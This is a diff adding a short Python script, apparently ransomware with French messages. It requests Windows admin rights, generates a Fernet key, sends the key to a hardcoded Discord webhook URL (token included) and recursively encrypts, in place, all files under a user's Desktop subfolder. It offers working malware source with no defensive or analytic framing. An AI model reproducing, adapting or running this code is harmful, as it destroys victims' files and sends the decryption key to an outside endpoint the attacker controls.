@@ -1,0 +1,71 @@
+from cryptography.fernet import Fernet
+import os
+import shutil
+import os
+import ctypes
+import sys
+import requests
+
+def run_as_admin():
+    if sys.platform == 'win32':
+        try:
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        except Exception as e:
+            print("Erreur lors de la demande de droits d'administrateur:", e)
+            sys.exit(1)
+    else:   
+        print("Ce script nécessite Windows pour demander des droits d'administrateur.")
+        sys.exit(1)
+
+
+#fld = "C:/Users/thoma/Desktop"
+fld = 'C:/Users/thoma/Desktop/pcr'
+def generate_key():
+    return Fernet.generate_key()
+
+def save_key(key, key_file):
+    print(key)
+    webhook_url = "https://discord.com/api/webhooks/1199717583411232838/33QC3UHjR0mcg3Oq948vSDi0DWcckjDvS4w9E7IM07xjE-i68B3NRg1Ir6TykXAjkwK2"
+    data = {"content": f"{key_file} : {key}"}
+    requests.post(webhook_url, json=data)
+    with open(key_file, 'w') as file:
+        file.write(str(key))
+
+
+
+def encrypt_file(key, input_file, output_file):
+    
+        cipher = Fernet(key)
+        with open(input_file, 'rb') as f:
+            data = f.read()
+        encrypted_data = cipher.encrypt(data)
+        with open(input_file, 'wb') as f:
+            f.write(encrypted_data)
+
+
+    
+def encrypt_folder(key, input_folder, output_folder):
+    try:
+        if not os.path.exists(output_folder):
+            os.makedirs(output_folder)
+
+        for item in os.listdir(input_folder):
+            s = os.path.join(input_folder, item)
+            d = os.path.join(input_folder, item)
+            if os.path.isdir(s):
+                encrypt_folder(key, s, d)
+            else:
+                encrypt_file(key, s, d)
+    except:
+        print("hihi")
+
+if __name__ == "__main__":
+    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
+        run_as_admin()
+        key = generate_key()
+        save_key(key, 'secret.key')
+        encrypt_folder(key, fld, 'vrenc')
+    else:
+        print("Le script est déjà en cours d'exécution en tant qu'administrateur.")
+
+        
